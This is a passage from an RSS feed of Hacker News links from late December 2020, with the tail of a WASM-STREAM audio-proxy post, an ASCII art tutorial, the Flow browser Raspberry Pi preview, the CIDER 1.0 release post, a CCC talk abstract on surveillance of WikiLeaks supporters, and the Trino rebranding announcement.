<p>Anyways, with my small little demo, I was galvanized and motivated enough to spend more time building something that would work for the congress.</p>
<h2 id="the-wasm-stream-architecture">The WASM-STREAM Architecture</h2>
<p>Ultimately, liquidsoap was not well-suited for my purpose. I also quickly realized that all I had to do was build a proxy between the <a target="_blank" rel="noopener" href="https://gist.github.com/ePirat/adc3b8ba00d85b7e3870">icecast protocol</a> and the <a target="_blank" rel="noopener" href="https://github.com/webcast/webcast.js/blob/master/SPECS.md">webcast protocol</a>. And that's what I ended up building. A small <a target="_blank" rel="noopener" href="https://github.com/webcast/webcast.js/blob/master/SPECS.md">JavaScript application</a> implementing two protocols. It listens for incoming WebSocket connections and calls icecast with a loooooonng PUT request to establish a stream.</p>
<p>WASM-STREAM itself doesn't do any encoding. It can, however, route an <code>audio/ogg</code> or an <code>audio/mpeg</code> stream from webcast to icecast. The encoding from WAV to mp3 takes place on the user's device already when the play the synthesizer.</p>
<h2 id="how-to-use-wasm-stream">How To Use WASM-STREAM</h2>
<p>Whether you have a ticket to rc3 or not, you can tune into the stream at <a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/stream">https://audio.daubenschuetz.de/stream</a>. It's an mp3-encoded stream, meaning it won't work in all browsers equally (Firefox works natively; Chrome et al. only support ogg/vorbis natively). If it doesn't, try a desktop application like iTunes or VLC.</p>
<p>The stream is continuously online. But if you don't hear anything then that's because nobody is currently playing the <a target="_blank" rel="noopener" href="https://audio.daubenschuetz.de/assets/">WASM-SYNTH</a>.</p>
<p>Finally, you're able to "dance" on the Social Dist0rtion Protocol's assembly dance floor. The rc3 orga was nice enough to allow us streaming audio on our map. <a target="_blank" rel="noopener" href="https://rc3.world/rc3/room/93840a8f-88f7-4f11-bb61-68800c4d4962/">Click here</a> to visit us directly on the rc3.world map.</p>

  </div></div>]]>
            </description>
            <link>https://timdaub.github.io/2020/12/27/wasm-stream/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25569112</guid>
            <pubDate>Tue, 29 Dec 2020 12:31:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Generative Grammar for Jazz Chord Sequences (1984)]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25569056">thread link</a>) | @wcerfgba
<br/>
December 29, 2020 | https://sci-hub.tf/https://www.jstor.org/stable/40285282 | <a href="https://web.archive.org/web/*/https://sci-hub.tf/https://www.jstor.org/stable/40285282">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://sci-hub.tf/https://www.jstor.org/stable/40285282</link>
            <guid isPermaLink="false">hacker-news-small-sites-25569056</guid>
            <pubDate>Tue, 29 Dec 2020 12:21:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hayley Wakenshaw's ASCII art tutorial]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25568945">thread link</a>) | @ducaale
<br/>
December 29, 2020 | https://www.ludd.ltu.se/~vk/pics/ascii/junkyard/techstuff/tutorials/Hayley_Wakenshaw.html | <a href="https://web.archive.org/web/*/https://www.ludd.ltu.se/~vk/pics/ascii/junkyard/techstuff/tutorials/Hayley_Wakenshaw.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><i>This tutorial is written by <a href="http://www.xs4all.nl/~klr/">Hayley Wakenshaw</a></i></p>
<hr>


<h2>Getting Started</h2>

<p>If you want to make ascii art the first thing you should know is that
you don't need a special program, or special skills to make it
with. All you need is somewhere to type text into - your e-mail
program, notepad, wordpad, that sort of thing - and an idea of what
you want to draw. There are no secrets or rules other than the
following:

</p><ol>
  <li> Use a non-proportional or fixed width font. Click <a href="http://www.xs4all.nl/~klr/fonts.html">HERE</a> for a
          page on this site that will tell you what they are, or ask
          me for the text version of the page via e-mail.

  </li><li> Don't use tabs!! Always, but always use the space bar (or your
 cursor keys/mouse if the program you're typing in supports that) for
 empty spaces. The reason for this is that different computers and
 programs interperet the size of a tab space differently, so although
 what you see on your screen looks fine, on someone else's your pic
 may look all split up.

 </li><li> Only use the keyboard characters on an American standard
 keyboard. That means all the letters, numbers and punctuation that
 you can see printed on the keyboard keys. You can use the shift key,
 but don't use the alt key to make characters. The reason for this is
 similar to that for not using tabs - different computers interperet
 alternative characters in different ways. The idea behind ascii is
 that all computers can read it because it's made up of characters
 that all computers will recognise.

 </li><li> Don't leave empty spaces at the end of each line. Make sure every
 line that you type ends on the last character, and not a few spaces
 after it. This can cause problems on other systems, with line
 wrapping and so on.
</li></ol>

<h2>Your First Ascii</h2>

<p>The best way to make a start is to take someone else's picture and see
if you can copy it. That way you get a feel for how you can use
different characters. We'll start easy. Try copying these shapes,
which only use the characters:

</p><pre> / \  |  _ 
 ___               ___
|   |      /\     /   \
|___|     /__\    \___/
</pre>

<p>Easy huh? Now try making the same shapes again using the characters: 

</p><pre>-  "  .  ,  `  :  &gt;  &lt;
</pre>

<p>This is what I came up with: 

</p><pre> .---.       .        .--.
 :   :     .' `.     &lt;    &gt;
 "---"     "---"      `--'
</pre>

<p>Bit more tricky, and it doesn't look as neat, but some of these
characters, and knowing how you can use them can come in very handy at
times, which we'll see later. Have a go at copying these, just for
practice. Change them if you like:
</p><pre> _   _    __    _   _                                   .^._    __
| |_| |_.'  `._| |_| |    /\  /\  /\  /\       /\      /   \|   \ \
|  _   _      _   _  |   /  \/  \/  \/  \    .'  `.   /_____V   / /
|_| |_| `.__.' |_| |_|  / /\  /\  /\  /\ \  &lt;      &gt;  |[]_[]|   \ \
                        \/  \/  \/  \/  \/   `.  .'   | |+| |   / /
                                               \/     `"""""'   \_\</pre>

<h2>Curves</h2>

<p>It's handy to know where the characters 'sit' on each line. Are they
at the top, in the middle or on the bottom of the line? A couple of
ascii characters vary in their position from computer to computer, but
mostly they all sit in the same place. Have a go yourself on your
keyboard. Here are some examples.

</p><pre>Top of line:            " ` '
Top or middle of line:  ^ * ~ =
Middle of line:         - +
Bottom of line:         _ . ,
</pre>

<p>You can use all these characters on one line to make a pattern, like
these:

</p><pre>_.,-=~+"^'`*`'^"+~=-,._.,-=~+"^'`*`'^"+~=-,._.,-=~+"^'`*`'^"+~=-,._


"^`'*-=~+,._.,+~=-*'`^"^`'*-=~+,._.,+~=-*'`^"^`'*-=~+,._.,+~=-*'`^"
</pre>
<p>Now try making a simple sig with a decorative border, using all the
characters we've met so far. This is what I came up with:
</p><pre>                        _________________________
  ..,,++~~--==**''``^^""  Hayley Jane wakenshaw  ""^^``''**==--~~++,,..
 /|\                     flump@quadrant.xs4all.nl                    /|\
&lt; : &gt; Flump's Fantastic Ascii Collection  http://www.xs4all.nl/~klr &lt; : &gt;
 \|/ "Daddy.. why doesn't the magnet pick up your floppy disks?..."  \|/
  ""^^''``**--==~~++,,.._________________________..,,++~~==--**``''^^""
</pre>

<h2>Using The Other Characters</h2>

<p>The other ascii characters fall into three categories. Either they're
the full height of the line or they're half height. Capitals and
numbers are always full height. Compare them to some of the others -
which are half height, and which are full height? Some examples:

</p><pre>Full height: A 7 % @ ! # ) ; &amp; $ ] } | / &gt; l t f k h d ?
Half height: a o v z
</pre>

<p>And then there's the 3rd sort. The characters that look like half
height, but sit a little lower on the line, like they would in
handwriting. These are: j g y p q

</p><p>And all together they can make a slight curve, just like the others:
</p><pre>pqyjgacoevA8!@)lf$%;$fl(@!8AveocagjypqacoevA8!@)lf$%;$fl(@!8Aveoc
</pre>

<h2>Lines and Diagonals</h2>

<p>There are three basic lines to any picture - straight (either
horizontally, or vertically), diagonal, and the third is the curve,
which includes circles. We'll look at straight and diagonal lines
first. Horizontal and vertical lines are simple in ascii - here are
some examples:
</p><pre>Horizontal: 8888888888888888888888888888888888888888888888888888888888
            """"""""""""""""""""""""""""""""""""""""""""""""""""""""""
            ----------------------------------------------------------
            __________________________________________________________
            ..........................................................


Vertical:   |    8    :    !    1    I
            |    8    :    !    1    I
            |    8    :    !    1    I
            |    8    :    !    1    I
            |    8    :    !    1    I
            |    8    :    !    1    I
</pre>
<p>Diagonals are a bit more tricky. You can make simple ones using the /
and \ keys. Diagonals with other gradients need a technique similar to
that used to make slight curves. Experiment yourself to see how you
can make different angles. Here are some examples to start you off:

</p><pre>       /         .'               _,-'                            __
      /        .'             _,-'                        __..--''
     /       .'           _,-'                      __..''
    /      .'         _,-'                  __..--''
   /     .'       _,-'              __..--''
  /    .'     _,-'          __..--''                   ____....----"""
 /   .'   _,-'      __..--''           ____....----""""
/  .'  ,-'  __..--''   ____....----""""
</pre>



<h2>Circles</h2>

<p>By now we've looked at the basic characters, character height, slight
curves, lines, and slopes. The last thing to look at is what many
people who make ascii have trouble with: circles. You're half way
there already, though, because ascii circles are basically a mix of
vertical and horizontal lines, slopes or diagonals, and curves. After
a little practice, you'll get a feel for making different sized
circles - I have a basic set of circles in a file that I refer to when
I need a circular or rounded shape in an ascii pic, so now I can make
them easily in all sorts of sizes. Start making small circles - how
many ways can you think of to make a circle in under 5 lines? The
bigger the circle the more rounded it can be, but try making circles
of different sizes and see what you come up with. These are mine:
</p><pre>                                               __
                          _   /""\            /  \
1 line:  O ()   2 lines: (_)  \__/   3 lines: \__/

                                                     ____
           ___               .-''-.                .'    `.
4 lines:  /   \   5 lines:  /      \   6 lines:   /        \
         |     |           |        |             |        |
          \___/             \      /              \        /
                             `-..-'                `.____.'

             _.-""""-._
9 lines:   .'          `.
          /              \
         |                |
         |                |
         |                |
          \              /
           `._        _.'
              `-....-'
</pre>

<p>That's the basic characters, and what you can do with them. Play with
them, see what patterns and ascii scribbles you can make. Have a go at
taking one of my pics, or another ascii pic from some of the excellent
sites around, and copy it. Then change it! See how you can use the
characters to make the picture look different. Can you make the
expression on a face change? Can you make an ascii person fatter,
thinner, taller, shorter? Give Barney the dinosaur a moustache, or,
much better, multiple wounds?  :-) This is how I learned. Many of my
first efforts were absolutely dreadful. So I looked at how someone
else had made the same sort of picture and learned from it. And I
still do - probably why people often say my style is very similar to
Joan Stark's!

</p><p>To get you started, cut and paste this head into wherever you want to
draw your ascii, and give it a face. Add a hat or a body. Or make the
hair shorter or longer. Make it a clown or a devil!

</p><pre>           ,-.,~~.
         ,'///||\\`.
        ///(((||)))\\.
       (((         )))
       _)))        |(_
      ._//\       /\\_.
      `-'_/`-._.-'\-`-'
        ' \/=._.=\/ hjw
</pre>

<h2>Moving Forward</h2>

<p>That's all the boring stuff about technique over. :-) What's coming up
is a step by step demo of how I go about turning a picture into ascii.

</p><p>When you first start, it's always a good idea to try to draw something
simple. Gromit the dog is made up of very simple shapes - just ovals
and circles, so I'll use him as an example.



</p><p>To start a picture, I look for the simplest or most prominent feature
of whatever I'm trying to draw. In Gromit's case, I reckon it's his
nose. :-) I'll try the 2 line circle and see where that takes
me. After I've drawn his nose I'll see if I can draw the shape of his
head around it:
</p><pre>               ___
              /   \
             |     |
            /   _   \
            |  (_)  |
             \     /
              `---'
</pre>

<p>Hmm.. don't like that - the top of his head isn't tall enough, but if
I make it any longer it looks too …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.ludd.ltu.se/~vk/pics/ascii/junkyard/techstuff/tutorials/Hayley_Wakenshaw.html">https://www.ludd.ltu.se/~vk/pics/ascii/junkyard/techstuff/tutorials/Hayley_Wakenshaw.html</a></em></p>]]>
            </description>
            <link>https://www.ludd.ltu.se/~vk/pics/ascii/junkyard/techstuff/tutorials/Hayley_Wakenshaw.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568945</guid>
            <pubDate>Tue, 29 Dec 2020 11:58:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reflections on the Lack of Adoption of Domain Specific Languages [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 24 | Comments 28 (<a href="https://news.ycombinator.com/item?id=25568703">thread link</a>) | @bnr
<br/>
December 29, 2020 | http://grammarware.net/text/2020/dsl-adoption.pdf | <a href="https://web.archive.org/web/*/http://grammarware.net/text/2020/dsl-adoption.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://grammarware.net/text/2020/dsl-adoption.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568703</guid>
            <pubDate>Tue, 29 Dec 2020 11:11:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Flow Browser Preview on the Raspberry Pi 400]]>
            </title>
            <description>
<![CDATA[
Score 156 | Comments 61 (<a href="https://news.ycombinator.com/item?id=25568650">thread link</a>) | @hotpoodle
<br/>
December 29, 2020 | https://www.ekioh.com/blog/flow-raspberry-pi/ | <a href="https://web.archive.org/web/*/https://www.ekioh.com/blog/flow-raspberry-pi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4917" role="article" itemscope="" itemtype="http://schema.org/BlogPosting">
						
	<header>	
		
		
	    </header> <!-- end article header -->
					
    <section itemprop="articleBody">
				<p>We’re very excited to be making a <a href="https://support.ekioh.com/download/">Flow preview</a> available for public download for the first time. Flow has a fast, modern, architecture that doesn’t share its layout engine with any other browser. While able to render most websites well, many perfectly, Flow still has some way to go. Each month more pages work, as more JavaScript APIs are added or additional CSS functionality created.</p>
<p><a href="https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot.png"><img src="https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-1024x576.png" alt="Flow running on a Raspberry Pi 400" width="1024" height="576" srcset="https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-1024x576.png 1024w, https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-300x169.png 300w, https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-768x432.png 768w, https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot-1536x864.png 1536w, https://www.ekioh.com/wp-content/uploads/2020-12-28-215433_1920x1080_scrot.png 1920w" sizes="(max-width: 1024px) 100vw, 1024px"></a></p>
<p><span id="more-4917"></span>We have chosen to release on just one platform initially, and there are a couple of reasons why. The Raspberry Pi’s hardware is largely fixed – you can’t swap the CPU or GPU. Variations in hardware could cause us to get distracted by issues that really shouldn’t be a priority right now.</p>
<p>Secondly, the Raspberry Pi 400 has very similar performance to many set-top box chips, so a release that demonstrates Flow’s animation performance on embedded hardware is more useful than on a PC where all browsers can easily get 60fps.</p>
<p>It’s been a year since our <a href="https://www.ekioh.com/devblog/full-google-mail-in-a-clean-room-browser/">Google Mail</a> blog post was picked up on <a href="https://twitter.com/FlowBrowser/status/1200070712121348096" data-wplink-edit="true">Twitter</a> and <a href="https://news.ycombinator.com/">Hacker News</a>. Our unexpected sudden fame meant we weren’t prepared for a public browser release, and expectations were (and probably still are) unrealistically high. Most of the HTML user interfaces that we had tried rendered well, and Flow regularly outperformed other browsers on set-top boxes. But, websites never looked quite right.</p>
<p>Last September, we detailed <a href="https://www.ekioh.com/devblog/can-we-fix-it/">our work</a> on tracking down and fixing the rendering of various major websites. No one bug was particularly tricky to fix once we had narrowed it down, but the end result made the browser engine feel much more like an actual browser.</p>
<p>In the meantime, some previously working sites have stopped working due to improvements in their content, for instance, Amazon now requires Web Cryptography to log in. This is a feature currently in progress.</p>
<p>This preview has many features missing that you would reasonably expect from a browser. Media source extensions, cryptography, and CSS Grid are being actively worked on. We have plenty more to get on with, including a UI, accessibility, and better text editing functionality.</p>
<p>We generally know which sites work and which don’t, but prioritise our commercial customers. Bug fixes that impact them usually fix websites, just not necessarily your favourite website. If you are able to help us track down why a particular website (or library) fails to work, we would be very appreciative of a small test case demonstrating the bug. The more simple the test case is, the more likely we are to fix the bug. We will read all emails but, sadly, may not be able to reply.</p>
<p>And finally, while the preview is for the Raspberry Pi 400, it also works on the Raspberry Pi 4. Previous models use a different GPU with different GPU drivers, so we are holding off releasing for those until we have optimised the graphics support.</p>
<p>We hope this preview demonstrates where we are with a brand new browser engine. The feedback we get for this public preview will directly affect the prospects for desktop platforms. Enjoy it, be critical, but please don’t expect Flow to be usable on your favourite websites right now.</p>
<hr>
<p>If you’d like to automatically receive our posts by email please&nbsp;<a href="https://www.ekioh.com/blogregister/">join our mailing list</a>.</p>
<!-- AddThis Advanced Settings above via filter on the_content --><!-- AddThis Advanced Settings below via filter on the_content --><!-- AddThis Advanced Settings generic via filter on the_content --><!-- AddThis Share Buttons above via filter on the_content --><!-- AddThis Share Buttons below via filter on the_content --><!-- AddThis Share Buttons generic via filter on the_content -->	</section> <!-- end article section -->
						
	 <!-- end article footer -->
						
	
<!-- #comments -->	
													
</article></div>]]>
            </description>
            <link>https://www.ekioh.com/blog/flow-raspberry-pi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568650</guid>
            <pubDate>Tue, 29 Dec 2020 10:58:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cider 1.0]]>
            </title>
            <description>
<![CDATA[
Score 228 | Comments 28 (<a href="https://news.ycombinator.com/item?id=25568181">thread link</a>) | @rayxi271828
<br/>
December 29, 2020 | https://metaredux.com/posts/2020/12/28/cider-1-0.html | <a href="https://web.archive.org/web/*/https://metaredux.com/posts/2020/12/28/cider-1-0.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <blockquote>
  <p>You can’t really know where you are going until you know where you have been.</p>

  <p>– Maya Angelou</p>
</blockquote>

<p><a href="https://cider.mx/">CIDER</a> started its life as an effort to replace a
hacked version of SLIME<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> with a proper environment for Clojure
development on Emacs. Many of you probably don’t remember those days,
but initially almost everyone was using a modified version of SLIME
for Clojure development, as there weren’t many (any?) alternatives
back in the day. The creation of CIDER was fueled mostly by the advent of
<a href="https://nrepl.org/">nREPL</a>, which was the first project that aimed to
provide a common tool-agnostic foundation for Clojure development
tools, and by the desire to address the impedance mismatch between
SLIME and Clojure.</p>

<p>CIDER was started in spring 2012 (under the name <code>nrepl.el</code>) by Phil
Hagelberg (of Leiningen fame), who hacked a prototype of an nREPL
client in Emacs Lisp on a flight to San Francisco. He got a bit stuck
on the socket-based bencode functionality and dropped it after the
flight, but not before pushing the code out and mentioning it on the
<a href="http://groups.google.com/group/clojure/browse_thread/thread/2bd91de7dca55ca4">Clojure mailing
list</a>.
What followed is the best example of the power of open-source software…</p>

<p>Tim King came across Phil’s post, picked <code>nrepl.el</code> back up, and it quickly became
a respectable competitor to SLIME. The project evolved at a rapid pace
and eventually superseded SLIME in August 2012.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> Unfortunately in
early 2013 Tim ran out of time for nrepl.el and after another period of
stagnation, handed it over to me, as I was the main
contributor to <code>nrepl.el</code> besides him back then. I have been the project’s
steward ever since. Third time’s a charm, right?</p>

<p>My tenure at the helm started with a bit of
controversy as I renamed nrepl.el to CIDER in version 0.3 to avoid the
common case of confusion between the nREPL server and the <code>nrepl</code>
package for Emacs.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> If I have to be completely honest - I also
wanted the project to have a name as cool as SLIME, and I’m fairly
certain I succeeded in that regard.</p>

<p>Eventually CIDER became one of the most popular development
environments in the Clojure community and it spawned many important
projects (e.g. <code>cider-nrepl</code> and <code>orchard</code>), that are widely
used by other development tools (e.g. <code>vim-fireplace</code>, Conjure, <code>iced-vim</code> and Calva). My work on CIDER also led to me
becoming the maintainer of nREPL and restarting its development
after a long period of hibernation. In hindsight probably the work
I did on nREPL was even more important than the work I did on CIDER.</p>

<p>Over the years a big ecosystem of packages grew around CIDER and nREPL
and they became important parts of the Clojure development
tooling. Today CIDER and nREPL face a lot of competition, but they are still
evolving at a steady pace, occasionally innovating, and serving as inspiration for
other tools. That makes me proud of the work we’ve done over the past 8 and a half years,
even if fewer and fewer people are using CIDER and Emacs every year.</p>

<p>One thing that constantly eluded me, however, was a 1.0 release. I
guess I’m the one to blame for this not happening sooner, as I had
some really grand ambitions for CIDER 1.0 (and some rather high
quality standards to go with them) and I was optimistic that somehow my plans would
become a reality in a reasonable amount of time.  Clearly I was
mistaken. Between me having to split my time between a dozen OSS projects
and most of them currently having no other active maintainers but me,
it eventually became obvious that the grand plans will have to wait
for CIDER 2.0. Grand plans and ambitions for world domination aside,
CIDER has been pretty stable for a while now and it seems to get the
job done. And there’s also the theory that if a piece of software has
some (happy) users then it qualifies for a 1.0 release… Oh, well…</p>

<p>Today the long wait is over - <a href="https://github.com/clojure-emacs/cider/releases/tag/v1.0.0">CIDER 1.0
(“Sofia”)</a>
is officially out!<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>  There’s nothing particularly interesting in this
release - it’s almost the same as CIDER 0.26. If you notice one
difference, it would probably be that commands that act on the symbol
at point (e.g. <code>cider-doc</code>) will no longer prompt you to confirm the
symbol. The old default was a mistake and I decided to adjust it for
this grand release. If you notice another difference, it’d probably be
that CIDER is officially using SemVer now. I still have to define
what exactly is going to constitute a breaking change going forward (e.g.
are changes to keybindings breaking changes?), but I’m reasonably
sure the adherence to SemVer will make CIDER upgrades less painful
for everyone.</p>

<p>There are many things that prompted me to do the 1.0 release now, but
probably the most important factor was that 2020 was such a horrible
year for all of us. I felt we needed all the good news we could
get to counter all the pain and suffering we’ve had to endure. While I
can’t help the fight against the pandemic, I hope I can cheer you up a
bit, by delivering another iteration of your favorite software that rocks.</p>

<p>So, what’s next? I don’t really have any particular plans for CIDER 1.1, so we’ll see how exactly it’s
going to shape up. Some vague ideas that have been floating in my mind are proper support for sideloading,
adding support for dynamic middleware loading, and improvements to the session management. No promises, though.
I’m also aiming to finally do an nREPL 1.0 release at some point. There are plenty of tickets
marked with the label “Good First Issue” on CIDER’s issue tracker, so if you’re looking for
more fun challenges after the end of the “Advent of Code” be my guest. I can definitely use all the help
I can get.</p>

<p>One thing is certain, though - CIDER will always stay true to its guiding principles:</p>

<ul>
  <li>REPL-first (as opposed to relying on static code analysis)</li>
  <li>Community-first (CIDER is defined by its community)</li>
  <li>Keep on rocking in a Lisp world!</li>
</ul>

<p>I’m writing this article while enjoying a bottle of proper (hard) French cider, so I think
I should wrap it up before I start enjoying myself too much.
Thanks to everyone who has been a part of CIDER’s community over the years! Thanks to everyone who has contributed to the project and supported it! Thanks
to everyone who still loves Emacs and CIDER! This release is for all of you!
Cheers!</p>



  </div></div>]]>
            </description>
            <link>https://metaredux.com/posts/2020/12/28/cider-1-0.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568181</guid>
            <pubDate>Tue, 29 Dec 2020 09:33:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CIA vs. Wikileaks [video]]]>
            </title>
            <description>
<![CDATA[
Score 320 | Comments 226 (<a href="https://news.ycombinator.com/item?id=25567659">thread link</a>) | @pdkl95
<br/>
December 28, 2020 | https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks | <a href="https://web.archive.org/web/*/https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<div>

<p>
<span></span>
<a href="https://media.ccc.de/search?p=andy">andy</a>

</p>

<p><a href="https://media.ccc.de/c/rc3/main" rel="tag">main</a>
<a href="https://media.ccc.de/c/rc3/Ethics,%20Society%20&amp;%20Politics" rel="tag">Ethics, Society &amp; Politics</a>
Playlists:
<a href="https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks/playlist">'rc3' videos starting here</a>
/
<a data-method="get" href="https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks/audio">audio</a></p>
<!-- %h3 About -->
<p>In this talk, I aim to report and show a collection of observations, physical, visual and other evidence of the last years incidents that strongly indicate a context of the US Central Intelligence Agency and/or potentially other entities of the US Government actions against Wikileaks and surrounding persons and organisations.</p>

<p>While the area of technical surveillance, SIGINT/COMINT and related Organizations and Methods have been more or less well understood in the hacker scene, the tactics and methods experienced and discussed in this talk are of a different type: For the moment, I would call it "initimidation surveillance" as it lacks the aspect of "covert" type of actions.</p>

<p>On the last Chaos Communication Congress, I have analysed the technical aspects of the surveillance in and surrounding the ecuadorian embassy where Julian Assange stayed; this talk shows what happened to other people - friends of Assange, supporters of Wikileaks etc - not only in England, but also in other countries / other parts of the world. </p>

<p>The idea is to not only show the scope of activities but also to contribute to a better understanding of these tactics, that might be applied also in completely different political environments where governments act in extralegal ways against activities they dislike, although they that are not a crime or easily criminalized.</p>

<h3>Download</h3>
<div>
<div>

<div>

<div>
<div>
<h4>These files contain multiple languages.</h4>
<p>
This Talk was translated into multiple languages. The files available
for download contain all languages as separate audio-tracks. Most
desktop video players allow you to choose between them.
</p>
<p>
Please look for "audio tracks" in your desktop video player.
</p>
</div>
</div>
</div>


</div>

</div>
<!-- %h3 Embed/Share -->

<h3>Tags</h3>

</div>





</div>]]>
            </description>
            <link>https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks</link>
            <guid isPermaLink="false">hacker-news-small-sites-25567659</guid>
            <pubDate>Tue, 29 Dec 2020 07:44:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We’re Rebranding PrestoSQL as Trino]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25566055">thread link</a>) | @rubinelli
<br/>
December 28, 2020 | https://trino.io/blog/2020/12/27/announcing-trino.html | <a href="https://web.archive.org/web/*/https://trino.io/blog/2020/12/27/announcing-trino.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>We’re rebranding PrestoSQL as Trino. The software and the community you have come to love and depend on aren’t 
going anywhere, we are simply renaming. <strong>Trino is the new name for PrestoSQL</strong>, the project supported by the founders 
and creators of Presto® along with the major contributors – just under a shiny new name. And now you can find us here:</p>

<ul>
  <li>GitHub: <a href="https://github.com/trinodb/trino">https://github.com/trinodb/trino</a>. Please give it a <a href="https://github.com/trinodb/trino/blob/master/.github/star.png">star</a>!</li>
  <li>Twitter: <a href="https://twitter.com/trinodb">@trinodb</a></li>
  <li>Slack: <a href="https://trino.io/slack.html">https://trino.io/slack.html</a></li>
</ul>

<p>If you want to learn why we’re doing this, read on…</p>

<!--more-->

<p>In 2012, Dain, David and Martin joined the Facebook data infrastructure team. Together with Eric Hwang, we created 
Presto® to address the problems of low latency interactive analytics over Facebook’s massive Hadoop data warehouse. 
One of our non-negotiable conditions was for Presto® to be an open source project. Open source is in our DNA - we had 
all used and participated in open source projects to various degrees in the past, and we recognized the power of open 
communities and developers coming together to build successful software that can stand the test of time.</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/team.jpg" alt=""></p>

<p>Over the next six years, we worked hard to build a healthy open source community and ecosystem around the project. We 
worked with developers and users all over the world and welcomed them into the Presto® community. Presto® was on a path 
of increasing growth and success, in large part because of the contributions from developers across many fields and all 
over the world.</p>

<p>Unfortunately in 2018, it became clear that Facebook management wanted to have tighter control over the project and its 
future. This culminated with their decision to grant Facebook developers commit rights on the project without any prior 
experience in Presto®. We strongly believe that this kind of decision is not compatible with having a healthy, open 
community. Moreover, they made this decision by fiat without engaging the Presto® community. As a matter of principle, 
we had no choice but to leave Facebook in order to focus on making sure Presto® continued to be a successful project 
with an open, collaborative and independent community. In reality, the choice was easy.</p>

<p>We started the Presto Software Foundation in January 2019 as an independent entity to oversee the development of the 
software and community, continuing the meritocratic system that had been in place over the previous 6 years. The community 
quickly consolidated under this new home. We intentionally stayed unemployed over the next 10 months to focus on expanding 
and strengthening the community by working directly with major users and contributors, as well as reaching out to a wider 
group of users and developers across the globe. This resulted in new use cases and an injection of energy, making the 
project more vibrant than ever before as even more new users and developers became engaged. But, don’t take our word for 
it, let the data speak for itself:</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/commits.png" alt=""></p>

<p>Months after this consolidation, Facebook decided to create a competing community using The Linux Foundation®. As a first 
action, Facebook applied for a trademark on Presto®. This was a surprising, norm-breaking move because up until that point, 
the Presto® name had been used without constraints by commercial and non-commercial products for over 6 years. In September 
of 2019, Facebook established the Presto Foundation at The Linux Foundation®, and immediately began working to enforce this 
new trademark. We spent the better part of the last year trying to agree to terms with Facebook and The Linux Foundation 
that would not negatively impact the community, but unfortunately we were unable to do so. The end result is that we must 
now change the name in a short period of time, with little ability to minimize user disruption.</p>

<p>On a personal note, and as the founders who named the project Presto® in the first place, this is an incredibly sad and 
disappointing turn of events. And while we will always have fondness for the name Presto®, we have come to accept that a 
name is just a name. To be frank, we’re tired of this endless distraction, and we intend to focus on what matters most 
and what we are best at doing – building high quality software everyone can rely on and fostering a healthy community 
of users and developers that build it and support it. We’re not going anywhere – we’re the same people, the same amazing 
software, under a new name: Trino.</p>

<p><strong>If you love this project, you already love Trino. ❤️</strong></p>


<p>Facebook is a registered trademark of Facebook Inc.  The Linux Foundation and Presto are trademarks of The Linux Foundation.</p>


  </div>

  
</article>

</div></div>]]>
            </description>
            <link>https://trino.io/blog/2020/12/27/announcing-trino.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25566055</guid>
            <pubDate>Tue, 29 Dec 2020 02:30:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Node.example.com Is an IP Address]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25565443">thread link</a>) | @nfrmatk
<br/>
December 28, 2020 | https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/ | <a href="https://web.archive.org/web/*/https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/">archive.org</a>
